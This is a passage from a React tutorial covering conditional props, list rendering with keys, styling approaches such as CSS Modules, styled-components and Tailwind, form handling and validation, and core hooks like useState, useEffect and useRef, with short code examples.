   <div className={cn("card", isFeatured && "featured", isDark && "dark-mode")}>
   ```

2. **Inline styles** :
   ```jsx
   <div style={{
     backgroundColor: isActive ? "#4CAF50" : "#f44336",
     fontWeight: important ? "bold" : "normal",
     opacity: disabled ? 0.6 : 1
   }}>
   ```

---

## 87. Conditional Props :

- Pass props conditionally (very common pattern).

```jsx
<Button
  variant={isPrimary ? "primary" : "secondary"}
  disabled={isSubmitting || !isValid}
  size={isMobile ? "small" : "medium"}
  onClick={handleSubmit}
  {...(isLoading && { "aria-busy": "true" })}
/>
```

- Spread pattern for multiple conditional props :

```jsx
const extraProps = {
  ...(isError && { "aria-invalid": true, "aria-describedby": "error-msg" }),
  ...(isSuccess && { "aria-describedby": "success-msg" }),
};

return <input {...extraProps} />;
```

**Summary Table – When to Use Which** :

| Technique         | Best For                            | Inline? | Readability | Complexity |
| ----------------- | ----------------------------------- | ------- | ----------- | ---------- |
| Early return / if | Preconditions, loading/error states | No      | High        | Any        |
| Ternary           | Simple two-way choice               | Yes     | Good        | Low–Medium |
| && operator       | Show/hide single element            | Yes     | Excellent   | Low        |
| Object lookup     | Many fixed cases                    | No      | High        | Medium     |
| Guard clauses     | Defensive component entry           | No      | Very high   | Any        |
| cn/clsx helpers   | Complex class names                 | Yes     | Excellent   | Any        |

---

## 9. <u> Lists & Keys </u> -

- Rendering lists is one of the most common tasks in React applications. React provides powerful patterns for efficiently displaying, updating, and managing dynamic collections of data (arrays of objects, items, etc.).
- The core mechanism for rendering lists in React is using JavaScript's `Array.map()` inside JSX, combined with the special `key` prop.

---

## 88. Rendering Lists :

- To render a list of items, you typically:

1. Have an array of data
2. Use `.map()` to transform each item into a React element
3. Return the resulting array of elements inside JSX (React knows how to render arrays of elements)

Basic example:

```jsx
function TodoList() {
  const todos = [
    { id: 1, text: "Learn React" },
    { id: 2, text: "Build a project" },
    { id: 3, text: "Deploy to production" },
  ];

  return (
    <ul>
      {todos.map((todo) => (
        <li>{todo.text}</li>
      ))}
    </ul>
  );
}
```

Important rules :

- The result of `.map()` must be placed directly inside JSX (or assigned to a variable first)
- Each child in an array or iterator must have a unique `key` prop (see below)

---

## 89. Array.map() :

- `Array.map()` is the most idiomatic way to render lists in React.

```jsx
const products = [
  { id: "p1", name: "Laptop", price: 1299 },
  { id: "p2", name: "Phone", price: 799 },
  { id: "p3", name: "Headphones", price: 199 },
];

return (
  <div className="product-grid">
    {products.map((product) => (
      <div key={product.id} className="product-card">
        <h3>{product.name}</h3>
        <p>${product.price}</p>
      </div>
    ))}
  </div>
);
```

- You can also destructure inside the map :

```jsx
{
  products.map(({ id, name, price }) => (
    <div key={id}>
      <h3>{name}</h3>
      <p>${price}</p>
    </div>
  ));
}
```

---

## 90. Keys Importance :

- The `key` prop is a special string attribute you **must** provide when rendering arrays of elements. Keys help React identify **which items have changed, been added, or been removed**.

Without proper keys, React falls back to index-based diffing → leading to bugs:

- Wrong items re-rendered
- State lost in components (e.g., form focus, animations)
- Unnecessary DOM mutations → performance issues

Correct :

```jsx
{
  todos.map((todo) => <TodoItem key={todo.id} todo={todo} />);
}
```

- React uses keys during the reconciliation (diffing) process to match old and new VDOM trees efficiently.

---

## 91. Stable Keys :

Keys must be :

- **Unique** - among siblings (not globally unique, just within the same list)
- **Stable** - consistent across renders for the same item
- **Predictable** - not random or changing

Best practice : Use a **stable, unique identifier** from your data (usually an ID from database, UUID, etc.).

- Good examples :

```jsx
key={item.id}              // database ID (best)
key={item.slug}            // unique URL-friendly string
key={`${category}-${item.id}`}  // composite key when needed
```

Bad examples :

```jsx
key={Math.random()}        // changes every render → terrible
key={new Date().getTime()} // changes every render
key={index}                // see next section
```

---

## 92. Index as Key (Pitfalls) :

- Using the array index as `key` is a common anti-pattern when the list can **reorder, filter, sort, add/remove items**.

Why it fails :

```jsx
{
  todos.map((todo, index) => <li key={index}>{todo.text}</li>);
}
```

Problems when :

- Items are reordered → React thinks different items moved
- Items are inserted/removed in the middle → wrong components get state
- Components have internal state (inputs, animations) → state jumps to wrong item

Real-world bug example:

```jsx
// Initial list: ["Apples", "Bananas"]
// User checks "Apples" (checkbox state stored in component)
// New list after sort: ["Bananas", "Apples"]
// → Checkbox now appears checked on "Bananas" because index 0 moved
```

**Rule of thumb** :

- Use index as key **only** when :
  - The list is **static** (never reorders, filters, or has items added/removed)
  - Items have **no internal state**
  - List is purely presentational

- Otherwise → always prefer a real ID.

---

## 93. Nested Lists :

- Rendering lists inside lists is common (e.g., categories with items).
- Just apply the same rules at each level :

```jsx
const categories = [
  {
    id: "c1",
    name: "Fruits",
    items: [
      { id: "f1", name: "Apple" },
      { id: "f2", name: "Banana" },
    ],
  },
  {
    id: "c2",
    name: "Vegetables",
    items: [{ id: "v1", name: "Carrot" }],
  },
];

return (
  <div>
    {categories.map((category) => (
      <div key={category.id}>
        <h2>{category.name}</h2>
        <ul>
          {category.items.map((item) => (
            <li key={item.id}>{item.name}</li>
          ))}
        </ul>
      </div>
    ))}
  </div>
);
```

- Each level needs its own unique `key`.

---

## 94. Conditional Lists :

- Combine list rendering with conditional rendering patterns :

```jsx
function TodoList({ todos, isLoading, error }) {
  if (isLoading) return <p>Loading...</p>;
  if (error) return <p>Error: {error}</p>;
  if (todos.length === 0) return <p>No todos yet. Add one!</p>;

  return (
    <ul>
      {todos.map((todo) => (
        <TodoItem key={todo.id} todo={todo} />
      ))}
    </ul>
  );
}
```

- Or inline :

```jsx
<ul>
  {todos.length > 0 ? (
    todos.map((todo) => <li key={todo.id}>{todo.text}</li>)
  ) : (
    <li>No items found</li>
  )}
</ul>
```

---

## 95. Dynamic Lists :

- Dynamic lists change based on user actions (add, remove, filter, sort).
- Use state to manage the array :

```jsx
function DynamicTodoList() {
  const [todos, setTodos] = useState([
    { id: crypto.randomUUID(), text: "Learn keys" },
  ]);

  const addTodo = () => {
    const newTodo = { id: crypto.randomUUID(), text: "New task" };
    setTodos((prev) => [...prev, newTodo]);
  };

  const removeTodo = (id) => {
    setTodos((prev) => prev.filter((t) => t.id !== id));
  };

  return (
    <div>
      <button onClick={addTodo}>Add Todo</button>
      <ul>
        {todos.map((todo) => (
          <li key={todo.id}>
            {todo.text}
            <button onClick={() => removeTodo(todo.id)}>×</button>
          </li>
        ))}
      </ul>
    </div>
  );
}
```

- Use `crypto.randomUUID()` (modern browsers) or a library like `uuid` for stable IDs when no backend ID exists.

---

## 96. Filtering Lists :

- Filter the array before mapping :

```jsx
function FilteredTodos({ todos, searchTerm }) {
  const filteredTodos = todos.filter((todo) =>
    todo.text.toLowerCase().includes(searchTerm.toLowerCase()),
  );

  return (
    <ul>
      {filteredTodos.map((todo) => (
        <li key={todo.id}>{todo.text}</li>
      ))}
    </ul>
  );
}
```

- Or inline :

```jsx
<ul>
  {todos
    .filter((todo) => !todo.completed)
    .map((todo) => (
      <li key={todo.id}>{todo.text}</li>
    ))}
</ul>
```

---

## 97. Sorting Lists :

- Sort before rendering (create a new array) :

```jsx
const sortedTodos = [...todos].sort((a, b) => {
  if (sortBy === "name") {
    return a.text.localeCompare(b.text);
  }
  return b.createdAt - a.createdAt; // newest first
});

return (
  <ul>
    {sortedTodos.map((todo) => (
      <li key={todo.id}>{todo.text}</li>
    ))}
  </ul>
);
```

- **Important**: Never mutate the original state array directly — always create a copy.

---

## 10. <u> Styling in React </u> -

- React offers multiple approaches to styling components, ranging from traditional CSS to modern CSS-in-JS solutions. Each method has its strengths, trade-offs, and best use cases. The choice often depends on project size, team preferences, performance requirements, and whether you want scoped styles, theming, or utility-first development.

---

## 98. Inline Styles :

- Inline styles in React are applied directly via the `style` prop, which accepts a **JavaScript object** with camelCase properties.

```jsx
function Button({ isActive }) {
  return (
    <button
      style={{
        backgroundColor: isActive ? "#4CAF50" : "#f44336",
        color: "white",
        padding: "12px 24px",
        border: "none",
        borderRadius: "4px",
        fontSize: "16px",
        cursor: "pointer",
        opacity: isActive ? 1 : 0.6,
        transition: "all 0.3s ease",
      }}
    >
      Click me
    </button>
  );
}
```

**Pros** :

- Dynamic styling is trivial (values from state/props)
- No extra files or build steps
- Scoped to the component

**Cons** :

- No pseudo-classes (`:hover`, `:focus`) or media queries
- Harder to maintain for large components
- No caching/reuse of styles
- Verbose syntax (camelCase, no shorthand like `padding: 12px 24px`)
- Best for : Small components, dynamic values, prototyping.

---

## 99. CSS Stylesheets :

- Classic approach: write CSS in `.css` files and import them.

```css
/* styles/Button.css */
.button {
  padding: 12px 24px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  cursor: pointer;
}
.button-primary {
  background-color: #4caf50;
  color: white;
}
.button-danger {
  background-color: #f44336;
  color: white;
}
```

```jsx
import "./Button.css";

function Button({ variant = "primary" }) {
  return <button className={`button button-${variant}`}>Click me</button>;
}
```

**Pros**:

- Familiar to everyone
- Full CSS features (pseudo-classes, media queries, animations)
- Easy to share across components

**Cons**:

- Global namespace → class name collisions possible
- No automatic scoping
- Harder to make truly dynamic
- Best for: Small projects, teams already comfortable with plain CSS.

---

## 100. CSS Modules :

- CSS Modules solve the global namespace problem by **automatically generating unique class names**.

```css
/* Button.module.css */
.button {
  padding: 12px 24px;
  border: none;
  border-radius: 4px;
}
.primary {
  background-color: #4caf50;
  color: white;
}
.danger {
  background-color: #f44336;
  color: white;
}
```

```jsx
import styles from "./Button.module.css";

function Button({ variant = "primary" }) {
  return (
    <button className={`${styles.button} ${styles[variant]}`}>Click me</button>
  );
}
```

**Pros**:

- Locally scoped class names (no collisions)
- Clear connection between CSS and component
- Works with all CSS features

**Cons**:

- Slightly more verbose imports
- Requires build tool support (Create React App, Vite, Next.js all support it)
- Best for : Medium to large projects that want scoped CSS without CSS-in-JS.

---

## 101. Styled Components :

- A popular **CSS-in-JS** library that lets you write actual CSS inside JavaScript and creates styled components.

```jsx
import styled from "styled-components";

const Button = styled.button`
  padding: 12px 24px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  cursor: pointer;
  background-color: ${(props) =>
    props.variant === "primary" ? "#4CAF50" : "#f44336"};
  color: white;
  transition: all 0.3s ease;
  &:hover {
    opacity: 0.9;
  }
`;

function App() {
  return <Button variant="primary">Click me</Button>;
}
```

**Pros**:

- Full CSS support + dynamic props
- Automatic scoping (unique class names)
- Theming support via `ThemeProvider`
- Great developer experience (colocation of styles and component)

**Cons**:

- Runtime overhead (styles injected at runtime)
- Larger bundle size
- Learning curve if new to CSS-in-JS

---

## 102. Emotion :

- Emotion is a lightweight, performant CSS-in-JS library with two main APIs: `styled` (like styled-components) and `css` prop.

```jsx
/** @jsxImportSource @emotion/react */
import { css } from "@emotion/react";

const buttonStyles = css`
  padding: 12px 24px;
  border: none;
  border-radius: 4px;
  background-color: #4caf50;
  color: white;

  &:hover {
    background-color: #45a049;
  }
`;

function Button() {
  return <button css={buttonStyles}>Click me</button>;
}
```

- Or using `styled` :

```jsx
import styled from "@emotion/styled";

const Button = styled.button`
  padding: 12px 24px;
  /* ... */
`;
```

**Pros** :

- Very fast (better runtime performance than styled-components)
- `css` prop is extremely flexible
- Great TypeScript support
- Theming via `ThemeProvider`
- Best for: Performance-sensitive apps, modern React projects.

---

## 103. SCSS/SASS :

- **SASS extends CSS** with variables, nesting, mixins, etc. Use with `.scss` files and CSS Modules or plain imports.

```scss
// Button.module.scss
$primary: #4caf50;
$danger: #f44336;

.button {
  padding: 12px 24px;
  border: none;
  border-radius: 4px;

  &.primary {
    background-color: $primary;
    color: white;
  }

  &.danger {
    background-color: $danger;
    color: white;
  }

  &:hover {
    opacity: 0.9;
  }
}
```

```jsx
import styles from "./Button.module.scss";

<button className={`${styles.button} ${styles.primary}`}>Click me</button>;
```

**Pros** :

- Powerful features (variables, nesting, mixins, functions)
- Familiar to CSS developers
- Works well with CSS Modules

**Cons** :

- Requires build tool support
- Still global unless using modules

---

## 104. Tailwind CSS :

- Utility-first CSS framework — write styles using class names directly in JSX.

```jsx
<button
  className={`
    px-6 py-3 rounded-md font-medium text-white transition
    ${
      isPrimary
        ? "bg-green-600 hover:bg-green-700"
        : "bg-red-600 hover:bg-red-700"
    }
    ${disabled ? "opacity-50 cursor-not-allowed" : ""}
  `}
>
  Click me
</button>
```

- With Tailwind + `clsx`/`cn` helper :

```jsx
import { cn } from "@/lib/utils";

<button
  className={cn(
    "px-6 py-3 rounded-md font-medium text-white transition",
    isPrimary
      ? "bg-green-600 hover:bg-green-700"
      : "bg-red-600 hover:bg-red-700",
    disabled && "opacity-50 cursor-not-allowed",
  )}
>
  Click me
</button>;
```

**Pros** :

- Extremely fast development
- Consistent design
- No context switching between CSS and JSX
- Excellent responsive utilities

**Cons** :

- Long class strings
- Requires discipline to avoid bloat
- Learning curve for utility classes

---

## 105. CSS-in-JS :

- General term for libraries that let you write CSS in JavaScript (Emotion, styled-components, JSS, Linaria, Vanilla Extract, etc.).

**Advantages** :

- Scoped styles
- Dynamic values via props/state
- Theming
- Colocation (styles next to component)

**Disadvantages** :

- Runtime cost (some libraries)
- Larger bundles
- Different mental model than traditional CSS

---

## 106. Dynamic Styling :

- Change styles based on state, props, or runtime values.
- Examples :

```jsx
// Inline
style={{ color: isActive ? 'green' : 'red' }}

// Tailwind
className={cn("text-lg", isActive && "font-bold text-green-600")}

// CSS Modules
className={styles[isActive ? 'active' : 'inactive']}

// Emotion
css`color: ${isActive ? 'green' : 'red'};`
```

---

## 107. Conditional Styling :

- Combine dynamic + conditional patterns (see section 8 for more examples).

```jsx
<div
  className={cn(
    "p-4 rounded-lg",
    isSuccess
      ? "bg-green-100 border-green-500"
      : isError
        ? "bg-red-100 border-red-500"
        : "bg-gray-100 border-gray-300",
  )}
>
  {message}
</div>
```

---

## 108. Global Styles :

- Apply styles that affect the entire app (reset, typography, etc.).
- Common approaches :
- Import a global CSS file in `index.js` / `main.tsx`
  ```jsx
  import "./global.css";
  ```
- Use `:root` or `body` selectors
- Styled-components `createGlobalStyle`

  ```jsx
  import { createGlobalStyle } from "styled-components";

  const GlobalStyle = createGlobalStyle`
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
    }
  `;
  ```

---

## 109. Theming :

- Centralized theme management for consistent colors, typography, spacing.
- Common solutions :
- **styled-components / Emotion** `ThemeProvider`
  ```jsx
  <ThemeProvider theme={{ colors: { primary: "#4CAF50" } }}>
    <App />
  </ThemeProvider>
  ```
- **Tailwind** with custom config (`tailwind.config.js`)
- **CSS Variables** (see below)

---

## 110. CSS Variables (Custom Properties) :

- Modern, powerful way to handle theming and dynamic styles.

```css
/* global.css */
:root {
  --primary: #4caf50;
  --danger: #f44336;
  --spacing-unit: 8px;
}

.dark {
  --primary: #66bb6a;
}
```

```jsx
<button style={{ backgroundColor: "var(--primary)" }}>Click</button>
```

- Or in Tailwind :

```jsx
<div className="bg-[--primary] text-white">Themed</div>
```

- **Advantages**: Works everywhere, dynamic updates via JS, great for dark mode.

---

## 111. Responsive Design in React :

- Common patterns :

1. **Tailwind responsive utilities**

   ```jsx
   <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
   ```

2. **Media queries in CSS/SCSS**

   ```scss
   .container {
     padding: 1rem;
     @media (min-width: 768px) {
       padding: 2rem;
     }
   }
   ```

3. **useMediaQuery** hook (custom or from libraries like `react-responsive`)

   ```jsx
   const isMobile = useMediaQuery("(max-width: 768px)");

   return isMobile ? <MobileNav /> : <DesktopNav />;
   ```

4. **CSS Container Queries** (emerging, modern browsers)

- Best practice: Prefer utility-first (Tailwind) or CSS variables + media queries for maintainable responsive design.

**Summary – Choosing a Styling Approach**

| Approach          | Best For                          | Scoping | Dynamic   | Theming   | Bundle Size  | Learning Curve |
| ----------------- | --------------------------------- | ------- | --------- | --------- | ------------ | -------------- |
| Inline            | Small components, prototyping     | Yes     | Excellent | Poor      | None         | Low            |
| Plain CSS         | Small apps, traditional teams     | No      | Poor      | Poor      | None         | Low            |
| CSS Modules       | Medium/large apps, scoped CSS     | Yes     | Good      | Poor      | None         | Medium         |
| Styled Components | Theming, colocation, large apps   | Yes     | Excellent | Excellent | Medium       | Medium         |
| Emotion           | Performance, modern apps          | Yes     | Excellent | Excellent | Small        | Medium         |
| Tailwind CSS      | Rapid development, design systems | No\*    | Excellent | Excellent | Small–Medium | Medium         |
| SCSS + Modules    | Teams that love SASS features     | Yes     | Good      | Poor      | None         | Medium         |

- \*Tailwind can be scoped with `@apply` or component libraries.

---

## 11. <u> Forms </u> -

- Forms are a core part of most interactive React applications. React provides two main philosophies for managing form inputs: **controlled** and **uncontrolled**. Controlled inputs are overwhelmingly preferred in modern React because they give you full control over the form state, make validation easier, enable dynamic behavior, and keep the UI in sync with the application state.

---

## 112. Controlled Inputs :

- A controlled input is one where **React is the single source of truth** for the input's value. The value is stored in React state, and every change updates that state via an `onChange` handler.

Key characteristics :

- `value` prop is set from state
- `onChange` handler updates state
- React drives the input — never the DOM

Basic example (single input) :

```jsx
import { useState } from "react";

function NameForm() {
  const [name, setName] = useState("");

  const handleChange = (e) => {
    setName(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    alert(`Submitted name: ${name}`);
  };

  return (
    <form onSubmit={handleSubmit}>
      <label>
        {" "}
        Name:
        <input
          type="text"
          value={name}
          onChange={handleChange}
          placeholder="Enter your name"
        />
      </label>
      <button type="submit">Submit</button>
    </form>
  );
}
```

Advantages :

- Instant validation & feedback
- Easy to reset, clear, or pre-fill
- Consistent state across re-renders
- Works perfectly with derived state and conditional rendering

---

## 113 Uncontrolled Inputs :

- An uncontrolled input lets the **DOM manage its own value**. You access the value only when needed (usually on submit) via a ref.

Example :

```jsx
import { useRef } from "react";

function UncontrolledNameForm() {
  const nameRef = useRef(null);

  const handleSubmit = (e) => {
    e.preventDefault();
    alert(`Submitted name: ${nameRef.current.value}`);
  };

  return (
    <form onSubmit={handleSubmit}>
      <label>
        {" "}
        Name:
        <input
          type="text"
          ref={nameRef}
          defaultValue="Akhil" // optional initial value
          placeholder="Enter your name"
        />
      </label>
      <button type="submit">Submit</button>
    </form>
  );
}
```

When to use uncontrolled :

- Simple forms with no validation or real-time feedback
- Integrating legacy/non-React code
- File inputs (almost always uncontrolled)
- Performance in very large forms (rare)
- **Modern recommendation** : Use **controlled** inputs for almost everything except file inputs.

---

## 114. Form State Management :

- Managing multiple inputs efficiently is a common challenge.
- Approaches :

1. **Multiple useState hooks** (simple forms) :

   ```jsx
   const [name, setName] = useState("");
   const [email, setEmail] = useState("");
   const [age, setAge] = useState("");
   ```

2. **Single object state** (most common for medium forms) :

   ```jsx
   const [formData, setFormData] = useState({
     name: "",
     email: "",
     age: "",
     newsletter: false,
   });

   const handleChange = (e) => {
     const { name, value, type, checked } = e.target;
     setFormData((prev) => ({
       ...prev,
       [name]: type === "checkbox" ? checked : value,
     }));
   };
   ```

3. **useReducer** (complex forms with interdependent logic) :

   ```jsx
   const initialState = { name: "", email: "", submitted: false };

   function formReducer(state, action) {
     switch (action.type) {
       case "UPDATE_FIELD":
         return { ...state, [action.field]: action.value };
       case "RESET":
         return initialState;
       default:
         return state;
     }
   }
   ```

4. **Form libraries** (large/complex apps)
   - React Hook Form (lightweight, performant, great validation)
   - Formik (feature-rich, but heavier)
   - Zod + React Hook Form (type-safe validation)

---

## 115. Input Types :

- HTML input types supported in React (controlled unless noted) :
- `text`, `password`, `email`, `tel`, `url`, `search`, `number`
- `date`, `datetime-local`, `month`, `week`, `time`
- `checkbox`, `radio`
- `file` (always uncontrolled)
- `hidden`, `color`, `range`
- All controlled inputs follow the same pattern: `value` + `onChange`.

---

## 116. Text Inputs :

```jsx
<input
  type="text"
  value={formData.name}
  onChange={handleChange}
  name="name"
  placeholder="Your full name"
  maxLength={50}
  required
/>
```

- Common attributes: `placeholder`, `maxLength`, `minLength`, `pattern`, `autoComplete`, `autoFocus`

---

## 117. Checkbox Inputs :

- Single checkbox :

```jsx
<label>
  <input
    type="checkbox"
    name="newsletter"
    checked={formData.newsletter}
    onChange={handleChange}
  />
  Subscribe to newsletter
</label>
```

- Multiple checkboxes (array in state) :

```jsx
const [interests, setInterests] = useState([]);

const handleCheckbox = (e) => {
  const { value, checked } = e.target;
  setInterests((prev) =>
    checked ? [...prev, value] : prev.filter((v) => v !== value),
  );
};

return (
  <>
    <label>
      <input
        type="checkbox"
        value="react"
        checked={interests.includes("react")}
        onChange={handleCheckbox}
      />
      React
    </label>
    <label>
      <input
        type="checkbox"
        value="tailwind"
        checked={interests.includes("tailwind")}
        onChange={handleCheckbox}
      />
      Tailwind CSS
    </label>
  </>
);
```

---

## 118. Radio Buttons :

- Radio buttons in a group share the same `name` attribute.

```jsx
const [gender, setGender] = useState("");

return (
  <div>
    <label>
      <input
        type="radio"
        name="gender"
        value="male"
        checked={gender === "male"}
        onChange={(e) => setGender(e.target.value)}
      />{" "}
      Male
    </label>
    <label>
      <input
        type="radio"
        name="gender"
        value="female"
        checked={gender === "female"}
        onChange={(e) => setGender(e.target.value)}
      />{" "}
      Female
    </label>
  </div>
);
```

---

## 119. Select Dropdowns :

- Single select :

```jsx
<select value={formData.role} onChange={handleChange} name="role">
  <option value="">Select role</option>
  <option value="developer">Developer</option>
  <option value="designer">Designer</option>
  <option value="manager">Manager</option>
</select>
```

- Multiple select (`multiple` attribute + array state) :

```jsx
<select
  multiple
  value={formData.skills}
  onChange={(e) => {
    const options = [...e.target.selectedOptions].map((o) => o.value);
    setFormData((prev) => ({ ...prev, skills: options }));
  }}
>
  <option value="react">React</option>
  <option value="node">Node.js</option>
  <option value="sql">SQL</option>
</select>
```

---

## 120. Textareas :

```jsx
<textarea
  value={formData.message}
  onChange={handleChange}
  name="message"
  rows={6}
  placeholder="Your message here..."
/>
```

- Behaves exactly like `<input type="text">` for controlled usage.

---

## 121. File Inputs :

- File inputs are **always uncontrolled** — React cannot set their value for security reasons.

```jsx
function FileUpload() {
  const fileInputRef = useRef(null);

  const handleSubmit = (e) => {
    e.preventDefault();
    const file = fileInputRef.current.files[0];
    if (file) {
      console.log("Selected file:", file.name, file.size);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="file" ref={fileInputRef} accept=".pdf,.jpg,.png" multiple />
      <button type="submit">Upload</button>
    </form>
  );
}
```

- Use libraries like `react-dropzone` for drag-and-drop UX.

---

## 122. Form Validation :

- Two main layers :

1. **HTML5 validation** (browser built-in)
2. **Custom validation** (application logic)

---

## 123. HTML5 Validation :

```jsx
<input
  type="email"
  required
  minLength={5}
  maxLength={100}
  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
  title="Please enter a valid email"
/>
```

Common attributes :

- `required`
- `min`, `max`, `minLength`, `maxLength`
- `pattern`
- `type="email"`, `url`, `tel`, etc.
- Use `:invalid` pseudo-class for styling.

---

## 124. Custom Validation :

- Most apps need more than HTML5 offers.
- Patterns :

1. **On change + on submit** (real-time + final check) :

   ```jsx
   const [errors, setErrors] = useState({});

   const validate = () => {
     const newErrors = {};
     if (!formData.name.trim()) newErrors.name = "Name is required";
     if (!/\S+@\S+\.\S+/.test(formData.email))
       newErrors.email = "Invalid email";
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };

   const handleSubmit = (e) => {
     e.preventDefault();
     if (validate()) {
       // submit
     }
   };
   ```

2. **Using React Hook Form + Zod** (recommended 2026 pattern) :

   ```jsx
   import { useForm } from "react-hook-form";
   import { zodResolver } from "@hookform/resolvers/zod";
   import * as z from "zod";

   const schema = z.object({
     name: z.string().min(2, "Name must be at least 2 characters"),
     email: z.string().email("Invalid email address"),
     age: z.number().min(18, "Must be 18 or older"),
   });

   function MyForm() {
     const {
       register,
       handleSubmit,
       formState: { errors },
     } = useForm({
       resolver: zodResolver(schema),
     });

     const onSubmit = (data) => console.log(data);

     return (
       <form onSubmit={handleSubmit(onSubmit)}>
         <input {...register("name")} />
         {errors.name && <p>{errors.name.message}</p>}
         {/* ... */}
         <button type="submit">Submit</button>
       </form>
     );
   }
   ```

---

## 125. Form Submission :

- Always prevent default behavior :

```jsx
<form onSubmit={(e) => {
  e.preventDefault();
  // handle submission
}}>
```

Common patterns :

- `fetch` / `axios` POST request
- Disable button while submitting (`isSubmitting` state)
- Show success/error messages
- Reset form after success

---

## 126. Handling Multiple Inputs :

- Use one `handleChange` with dynamic `[name]` :

```jsx
const handleChange = (e) => {
  const { name, value, type, checked } = e.target;
  setFormData((prev) => ({
    ...prev,
    [name]:
      type === "checkbox" ? checked : type === "number" ? Number(value) : value,
  }));
};
```

- Then apply to all inputs :

```jsx
<input name="name" value={formData.name} onChange={handleChange} />
<input name="email" type="email" value={formData.email} onChange={handleChange} />
<input type="checkbox" name="terms" checked={formData.terms} onChange={handleChange} />
```

---

## 127. Resetting Forms :

- Ways to reset :

1. **Set state back to initial** :
   ```jsx
   const resetForm = () => {
     setFormData({
       name: "",
       email: "",
       message: "",
     });
   };
   ```
2. **Using form ref + HTML reset** :

   ```jsx
   const formRef = useRef(null);

   <form ref={formRef}>
     {/* inputs */}
   </form>

   <button type="button" onClick={() => formRef.current.reset()}> Reset </button>
   ```

- Note : Works only for uncontrolled inputs or when combined with state reset.

3. **React Hook Form reset**

   ```jsx
   const { reset } = useForm();
   reset(); // or reset({ name: '', email: '' })
   ```

---

## 12. <u> React Hooks (Core) </u> -

- React Hooks, introduced in React 16.8 (2019), allow functional components to use state, lifecycle features, and other React capabilities without classes. Hooks are functions that "hook into" React's state and lifecycle from function components. They promote cleaner, more reusable code and have become the standard way to write React in 2026.

---

## 128. Hooks Rules :

- Hooks follow strict rules to ensure they work correctly with React's rendering and reconciliation :

1. **Only Call Hooks at the Top Level** :
   Do not call Hooks inside loops, conditions, or nested functions. Always call them at the top of your component function. This ensures Hooks are called in the same order on every render, allowing React to track state correctly.

   ```jsx
   // Correct
   function MyComponent() {
     const [count, setCount] = useState(0);
     useEffect(() => {
       /* ... */
     });
     return <div>{count}</div>;
   }

   // Incorrect (conditional Hook call)
   function Bad() {
     if (condition) {
       useEffect(() => {
         /* ... */
       }); // React will throw error
     }
   }
   ```

2. **Only Call Hooks from React Function Components or Custom Hooks**  
   Not from regular JavaScript functions, class components, or outside components.
3. **Custom Hooks Must Start with "use"**  
   This convention helps identify them and enables linting rules (e.g., `eslint-plugin-react-hooks`).
4. **Hooks Are Not Compatible with Class Components**  
   But you can mix functional and class components in the same app.

- React's `eslint-plugin-react-hooks` plugin enforces these rules. Always enable it in your project.

---

## 129. useState :

- `useState` adds local state to functional components.
- Syntax : `const [state, setState] = useState(initialValue);`

- `state`: Current value
- `setState`: Updater function (accepts new value or function)
- `initialValue`: Can be primitive, object, array, or lazy function
- Details : See section 6 for in-depth coverage (initial state, updates, immutability, etc.).
- Example with lazy init :

```jsx
const [user, setUser] = useState(() => loadUserFromLocalStorage());
```

- If we try to update an object passed on to the initial state of the useState then we have to update the object by spreading the prevState and then update so that we don't lose the prev state.
- Or create multiple useStates.

---

## 130. useEffect :

- `useEffect` runs side effects (e.g., data fetching, subscriptions, DOM manipulations) after render.
- Syntax : `useEffect(callback, dependencies);`
- `callback` : Function with effect code. Can return a cleanup function.
- `dependencies` : Array of values. Effect runs if any change (or empty [] for mount only).

How it works :

1. Component renders
2. DOM updates
3. `useEffect` callback runs (if deps changed or first render)

Example : Fetch data

```jsx
useEffect(() => {
  const fetchData = async () => {
    const response = await fetch("/api/data");
    const data = await response.json();
    setData(data);
  };
  fetchData();
}, []); // Empty deps → runs once after mount
```

```jsx
useEffect(() => {
  console.log("Resource Changed");

  return () => {
    console.log("Return from resource change");
  };
}, [resourceType]);
```

Common uses :

- API calls
- Event listeners (add in callback, remove in cleanup)
- Timers/intervals

---

## 131. Effect Dependencies :

- Dependencies control when the effect re-runs :

- No deps : Runs after every render
- Empty [] : Runs once after initial render
- [var1, var2] : Runs after initial + when var1 or var2 changes

Rules :

- Include **all** values from component scope used in callback (state, props, functions)
- ESLint `exhaustive-deps` rule helps
- If a function is a dep, wrap in `useCallback`

Example with dep :

```jsx
useEffect(() => {
  document.title = `You clicked ${count} times`;
}, [count]); // Re-runs when count changes
```

- Omit deps only if you truly want every-render behavior (rare).

---

## 132. Cleanup Functions :

- Return a function from the effect callback to clean up (e.g., remove listeners, cancel subscriptions).

Runs:

- Before next effect run
- On unmount

```jsx
useEffect(() => {
  const handleResize = () => {
    /* ... */
  };
  window.addEventListener("resize", handleResize);

  return () => {
    window.removeEventListener("resize", handleResize);
  };
}, []); // Cleanup on unmount
```

- Essential for preventing memory leaks in long-lived apps.

---

## 133. Multiple Effects :

- Use as many `useEffect` as needed — better than one giant effect.

```jsx
useEffect(() => {
  /* Fetch user */
}, [userId]);
useEffect(() => {
  /* Setup subscription */
}, [user]);
useEffect(() => {
  /* Update title */
}, [title]);
```

- This separates concerns and makes code easier to read/maintain.

---

## 134. useContext :

- `useContext` subscribes to React Context values without prop drilling.
- Syntax : `const value = useContext(MyContext);`

Example :

```jsx
// Context creation
const ThemeContext = createContext("light");

// Provider
<ThemeContext.Provider value="dark">
  <App />
</ThemeContext.Provider>;

// Consumer
function Button() {
  const theme = useContext(ThemeContext);
  return <button className={theme}>Click</button>;
}
```

- Re-renders when context value changes
- Use for global state (theme, auth, i18n)

---

## 135. useRef :

- `useRef` creates a mutable ref object that persists across renders.
- Syntax : `const ref = useRef(initialValue);`

Uses :

1. **DOM refs**: Access DOM nodes

   ```jsx
   const inputRef = useRef(null);
   <input ref={inputRef} />;
   inputRef.current.focus();
   ```

2. **Mutable values** (not causing re-renders)
   ```jsx
   const intervalRef = useRef(null);
   useEffect(() => {
     intervalRef.current = setInterval(() => {
       /* ... */
     }, 1000);
     return () => clearInterval(intervalRef.current);
   }, []);
   ```

- `ref.current` is mutable
- Doesn't trigger re-renders on change

---

## 136. useReducer :

